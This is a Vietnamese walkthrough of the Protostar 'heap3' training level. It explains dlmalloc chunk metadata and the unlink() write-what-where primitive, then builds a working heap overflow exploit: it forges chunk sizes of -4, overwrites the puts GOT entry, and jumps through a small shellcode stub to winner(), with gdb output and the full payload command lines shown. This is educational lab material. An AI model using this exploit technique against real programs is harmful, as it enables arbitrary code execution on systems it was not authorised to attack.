# HEAP THREE

## About

This level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to change program execution.

This level is at /opt/protostar/bin/heap3

## Source code

```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  char *a, *b, *c;

  a = malloc(32);
  b = malloc(32);
  c = malloc(32);

  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);

  free(c);
  free(b);
  free(a);

  printf("dynamite failed?\n");
}
```

## Solutions

`HEAP THREE` muốn chúng ta tìm hiểu về `metadata heap` và cách chúng ta có thể khai thác nó để thực thi mã. Để vượt qua thử thách này bạn cần khai thác 1 hành vi của `free()` là `unlink()`.

Trước khi bắt đầu thử thách ta sẽ xem qua hai thứ.

* Một `chunk` được phân bổ do DougLea's Malloc quản lý trông giống như sau:

```
    chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
             | prev_size: size of the previous chunk, in bytes (used   |
             | by dlmalloc only if this previous chunk is free)        |
             +---------------------------------------------------------+
             | size: size of the chunk (the number of bytes between    |
             | "chunk" and "nextchunk") and 3 bits status information  |
      mem -> +---------------------------------------------------------+
             | fd: not used by dlmalloc because "chunk" is allocated   |
             | (user data therefore starts here)                       |
             + - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
             | bk: not used by dlmalloc because "chunk" is allocated   |
             | (there may be user data here)                           |
             + - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
             |                                                         .
             .                                                         .
             . user data (may be 0 bytes long)                         .
             .                                                         .
             .                                                         |
nextchunk -> + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
             | prev_size: not used by dlmalloc because "chunk" is      |
             | allocated (may hold user data, to decrease wastage)     |
             +---------------------------------------------------------+
```

* Các `free chunks` được lưu trữ trong `circular doubly-linked lists` và trông giống như sau:

```
    chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
             | prev_size: may hold user data (indeed, since "chunk" is |
             | free, the previous chunk is necessarily allocated)      |
             +---------------------------------------------------------+
             | size: size of the chunk (the number of bytes between    |
             | "chunk" and "nextchunk") and 3 bits status information  |
             +---------------------------------------------------------+
             | fd: forward pointer to the next chunk in the circular   |
             | doubly-linked list (not to the next _physical_ chunk)   |
             +---------------------------------------------------------+
             | bk: back pointer to the previous chunk in the circular  |
             | doubly-linked list (not the previous _physical_ chunk)  |
             +---------------------------------------------------------+
             |                                                         .
             .                                                         .
             . unused space (may be 0 bytes long)                      .
             .                                                         .
             .                                                         |
nextchunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
             | prev_size: size of "chunk", in bytes (used by dlmalloc  |
             | because this previous chunk is free)                    |
             +---------------------------------------------------------+
```

Bạn hãy nhớ chúng và giờ chúng ta sẽ bắt đầu thử thách.

Đây là bố cục của heap sau khi cấp phát cho ba con trỏ `a`, `b` và `c` rồi lấy input thông qua `strcpy()` (có thể buffer overflow) từ ba đối số của chương trình.

```
(gdb) r AAAA BBBB CCCC
(gdb) x/50x 0x804c000
0x804c000:      0x00000000      0x00000029      0x41414141      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x42424242      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x43434343      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
...
```

Hãy xem cách một `Chunk` được cấp phát trên bộ nhớ khi yêu cầu `malloc()`.

```
struct malloc_chunk {
	INTERNAL_SIZE_T		prev_size;
	INTERNAL_SIZE_T		size;
	struct malloc_chunk*	fd;
	struct malloc_chunk*	bk;
}
```

+) Thành viên `prev_size` chứa kích thước của `chunk` trước đến `chunk` hiện tại. Nó chỉ được sử dụng nếu `chunk` trước đó đã được giải phóng (đã gọi free()). Như bạn có thể thấy từ cách bố trí bộ nhớ heap, các thành viên `prev_size` của cả ba phần là NULL.

+) Thành viên `size` chứa kích thước của `chunk` hiện tại. Chúng ta thấy rằng giá trị của thành viên `size` là 0x00000029( 00101001 ở dạng nhị phân). Tham khảo trang glibc Malloc Internals, chúng ta thấy rằng các `chunk` được phân bổ theo bội số của 8 byte. Điều này có nghĩa là 3 bit thấp nhất của thành viên `size` sẽ luôn là 0.

+) Việc triển khai `malloc` sử dụng 3 bit này làm giá trị cờ. Trích dẫn từ trang glibc Malloc Internals, ba cờ được định nghĩa như sau:

* A (0x04)

	Allocated Arena - `The main Arena` sử dụng `heap` từ ứng dụng. Các `Arena` khác sử dụng `heap` từ mmap'd. Để ánh xạ một `chunk` vào một `heap`, bạn cần biết trường hợp nào áp dụng. Nếu bit này là 0, `chunk` này đến từ `The main Arena` và `heap` chính. Nếu bit này là 1, `chunk` này đến từ bộ nhớ mmap'd và vị trí của heap có thể được tính toán từ địa chỉ của `chunk`.

* M (0x02)

	MMap'd chunk - `chunk` này được phân bổ bằng một lệnh gọi đến mmap và hoàn toàn không phải là một phần của heap.

* P (0x01)

	`Chunk` trước đó đang được sử dụng - nếu được đặt, `chunk` trước đó vẫn đang được chương trình sử dụng, và do đó trường `pres_size` không hợp lệ. Lưu ý - một số trường hợp đặc biệt, chẳng hạn như những `chunk` trong fastbins (xem bên dưới) sẽ có bộ bit này mặc dù đã được giải phóng(free()). Bit này thực sự có nghĩa là `chunk` trước đó không nên được coi là một ứng cử viên để liên kết lại - nó "đang được sử dụng" bởi chương trình hoặc một số lớp tối ưu hóa khác cho việc phân bổ sau này nằm trên mã ban đầu của malloc.

+) Với thông tin này, chúng ta có thể thấy rằng ba `chunk` có kích thước là 40 byte và `chunk` trước đó đang được sử dụng.

+) Khi một `chunk` được giải phóng, `chunk` đó sẽ được thêm vào `a doubly linked free list` được sử dụng để theo dõi `chunk` nào hiện đang không sử dụng. Các thành viên `fd` và `bk` lần lượt là các con trỏ đến các `chunk` tiếp theo và trước đó và chỉ được đặt khi bản thân `chunk` đó được giải phóng.

+) Kỹ thuật `unlink ()` dựa trên một hành vi cụ thể của `free()`.

---------------------------------------------------------------------------------------------

[4.1] - Nếu `chunk` nằm ngay trước `chunk` được giải phóng không được sử dụng, nó sẽ bị xóa khỏi  `a doubly linked free list` của nó thông qua unlink () (nếu nó không phải là 'last_remainder') và được hợp nhất với `chunk` được giải phóng.

[4.2] - Nếu `chunk` nằm ngay sau `chunk` được giải phóng không được sử dụng, nó sẽ bị xóa khỏi `a doubly linked free list` thông qua unlink () (nếu nó không phải là 'last_remainder') và được hợp nhất với `chunk` được giải phóng.

---------------------------------------------------------------------------------------------

+) Việc `chunk` trước đó có được coi là chưa sử dụng hay không được xác định bởi `prev_size` trên `chunk` hiện tại có được đặt hay không.

`unlink() ` được định nghĩa như sau.

```
#define unlink( P, BK, FD ) {            \
[1] BK = P->bk;                          \
[2] FD = P->fd;                          \
[3] FD->bk = BK;                         \
[4] BK->fd = FD;                         \
}
```

P là `chunk` bạn muốn liên kết, `BK` và `FD` là những con trỏ tạm thời. Về cơ bản, khi gọi `free()` một `chunk`, `unlink()` hàm thực hiện hai hành động:

  1. Ghi giá trị của `P->bk` vào địa chỉ bộ nhớ được trỏ tới bởi `(P->fd) + 12`. Giá trị 12 là `offset` của phần tử `bk` của `P->fd`.
  2. Ghi giá trị của `P->fd` vào địa chỉ bộ nhớ được trỏ tới bởi `(P->bk) + 8`. Giá trị 8 là `offset` của phần tử `fd` của `P->bk`.

Bạn có thể hình dung như sau.

```
       --BK--                          P                       --FD--        
b ->=============                =============              =============<- a                    
    | prev_size |                | prev_size |              | prev_size |       
    |   size    |                |   size    |              |   size    |      
FD  |     a     |            FD  |     a     |          FD  |    ...    |
BK  |    ...    |            BK  |     b     |          BK  |     b     |
    |===========|                |===========|              |===========|
```

* Lấy giá trị `b` điền vào vị trí `a + 12`.

* Lấy giá trị `a` điền vào vị trí `b + 8`.

Quá trình trước và sau khi `unlink()` bạn có thể xem ảnh này để rõ hơn 

<h3 align="center"><img src="https://github.com/l1j9m4-0n1/Blog/blob/main/zOther/unlink.jpg"></h3>

+) Vì vậy, nếu chúng ta có thể kiểm soát các giá trị của `P->bk` và `P->fd`, chúng ta có thể ghi dữ liệu tùy ý vào một vị trí tùy ý trong bộ nhớ (overwrite everywhere).

Tiếp tục thực hiện chương trình, chúng ta thấy rằng cách bố trí heap như sau sau ba lần gọi `free()`.

```
(gdb) x/50x 0x804c000
0x804c000:      0x00000000      0x00000029      0x0804c028      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x0804c050      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
...
```

+) Chúng tôi nhận thấy rằng mặc dù `fd` được đặt chính xác cho các `chunk`, nhưng `prev_size` và `bk` không. Điều này là do một tính năng của bộ cấp phát được gọi là `fastbins`, được sử dụng cho các `chunk` nhỏ hơn 64 byte theo mặc định. Trích dẫn từ trang glibc Malloc Internals:

```
Các khối nhỏ được lưu trữ trong các thùng có kích thước cụ thể. Các `chunk` được thêm vào một thùng nhanh ("fastbin") không được kết hợp với các `chunk` liền kề - logic là để giữ cho truy cập nhanh (nên có tên như vậy). Các `chunk` trong thùng fastbins có thể được chuyển sang thùng khác nếu cần. Các `chunk` Fastbin được lưu trữ trong một danh sách liên kết duy nhất, vì chúng đều có cùng kích thước và các phần ở giữa danh sách không bao giờ cần được truy cập.
```

+) Trong quá trình khai thác, chúng tôi muốn các `chunk` của chúng tôi được coi như các `chunk` bình thường bằng cách kiểm soát `size` của `chunk`.

+) Có một rào cản cuối cùng đối với việc khai thác mà chúng ta cần phải vượt qua. Việc ghi vào `size` và `prev_size` yêu cầu sử dụng NULL byte. Chúng tôi không thể làm như vậy vì bất kỳ byte NULL nào mà chúng tôi chuyển vào chương trình dưới dạng đối số sẽ được coi là kết thúc chuỗi.

+) Có một cách là nếu cung cấp một giá trị như `0xFFFFFFFC` (-4 dưới dạng số nguyên có dấu), bộ cấp phát sẽ không đặt `chunk` trong `fastbin` vì `0xFFFFFFFC` khi là một số nguyên không dấu là một giá trị lớn hơn nhiều so với 64. Do tràn số nguyên trong quá trình số học con trỏ, bộ cấp phát nghĩ rằng `chunk` trước đó thực sự bắt đầu ở 4 byte sau thời điểm bắt đầu của `chunk` hiện tại. [Here](http://phrack.org/issues/57/8.html) mục `[ 3.6.1.2 - Proof of concept ]`

<h3 align="center"><img src="https://github.com/l1j9m4-0n1/Blog/blob/main/zOther/unlink1.png"></h3>

Cụ thể là sau khi check `previous chunk` là một `free chunk` thông qua `bit P`, trình quản lý phân bổ sẽ xác định địa chỉ của `previous chunk` của `current chunk` (chunk đang được tiến hành free) bằng cách lấy giá trị là địa chỉ của `current chunk` trừ đi giá trị tại member đầu tiên `(prev_size)` của current chunk đế có được địa chỉ chunk sẽ tiến hành `unlink()`.

=> Vì thế do trừ đi cho (-4) - tức là +4 dẫn đến phân bổ cho rằng `previous chunk` thực sự bắt đầu ở 4 bytes sau thời điểm bắt đầu của `current chunk`. 

### Tóm lại
+) Tổng hợp những gì chúng ta đã học được cho đến nay, chúng ta nhận được thông tin đầu vào sau cho chương trình. Chúng tôi ghi đè `prev_size` và `size` bằng -4. `fd` và `bk` tương ứng là `\x42\x42\x42\x42` và `\x43\x43\x43\x43`.

```
root@protostar:/opt/protostar/bin# ./heap3 AAAA `python -c 'print "A" * 32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff" + "A" * 4 + "\x42\x42\x42\x42\x43\x43\x43\x43"'` D
```

Bây giờ là cần tìm xem nên ghi vào đâu để thay đổi luồng thực thi. Chúng ta có thể ghi đè GOT  của `puts()` để trỏ tới `winner()`.

Địa chỉ GOT của `puts`.

```
0x08048935 <main+172>:  call   0x8048790 <puts@plt>
0x0804893a <main+177>:  leave
0x0804893b <main+178>:  ret
---Type <return> to continue, or q <return> to quit---c
End of assembler dump.
(gdb) x/2i 0x8048790
0x8048790 <puts@plt>:   jmp    DWORD PTR ds:0x804b128 <-- GOT của puts
0x8048796 <puts@plt+6>: push   0x68
(gdb)
```

Chúng ta cần trừ `0x804b128` đi 12 byte để `unlink()` sẽ ghi đúng vào địa chỉ của `GOT puts` khi cộng 12, khi đó ta cần ghi `\x1c\xb1\x04\x08`.

Bây giờ là địa chỉ của `winner`.

```
(gdb) print &winner
$1 = (void (*)(void)) 0x8048864 <winner>
```

Thử chạy payload

```
./heap3 `python -c 'print "AAAA"'` `python -c 'print "A" * 32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff" + "A" * 4 + "\x1c\xb1\x04\x08\x64\x88\x04\x08"'` D
```

Chúng ta nhận được lỗi `Segmentation fault`. Điều này xảy ra là do ta quên mất rằng `unlink` sẽ ghi đè hai lần, lần thứ hai là ghi `0x804b11c` vào `0x8048864` + 8 - Đây là phân vùng không cho phép ghi.

Chúng ta cần thay đổi đầu vào của mình sao cho khi ghi đến `P->bk + 8` là một nơi nào đó trong không gian địa chỉ bộ nhớ có thể ghi. Những gì chúng ta có thể làm là ghi đè `puts()` GOT bằng một vị trí trên heap có chứa một số shellcode có khả năng chuyển đến `winner()`.

```
push dword 0x8048864
ret
```

Chúng tôi biên dịch `shellcode` trên ra mã máy `\x68\x64\x88\x04\x08\xc3`, nó có 6 bytes nên khi `unlink()` ghi đến `P->bk + 8` sẽ không bị ghi đè shellcode và ghi nó vào phân bổ của `chunk` a - nơi cho phép ghi.

Giờ ta chạy thử:

```
root@protostar:/opt/protostar/bin# ./heap3 `python -c 'print "\x68\x64\x88\x04\x08\xc3"'` `python -c 'print "A" * 32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff" + "A" * 4 + "\x1c\xb1\x04\x08\x08\xc0\x04\x08"'` D
Illegal instruction
```

`Shellcode` bị ghi đè, ta nhớ lại 4 byte dữ liệu ban đầu cho mỗi `chunk` sẽ bị ghi đè khi `chunk` được giải phóng. Ở đây là `free(a)` đã ghi đè 4 byte đó nên ta sẽ thêm `AAAA` trước `shellcode` và cộng địa chỉ ghi lên 4.

Khai thác cuối cùng.

```
root@protostar:/opt/protostar/bin# ./heap3 `python -c 'print "AAAA\x68\x64\x88\x04\x08\xc3"'` `python -c 'print "A" * 32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff" + "A" * 4 + "\x1c\xb1\x04\x08\x0c\xc0\x04\x08"'` D
that wasn't too bad now, was it? @ 1649095327
```

```
Khai thác heap thực sự rất phức tạp và khó.
```

## Documents

<https://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf>

<https://sourceware.org/glibc/wiki/MallocInternals>


<http://phrack.org/issues/57/8.html>

<https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/>

<https://www.ayrx.me/protostar-walkthrough-heap/#heap-3>
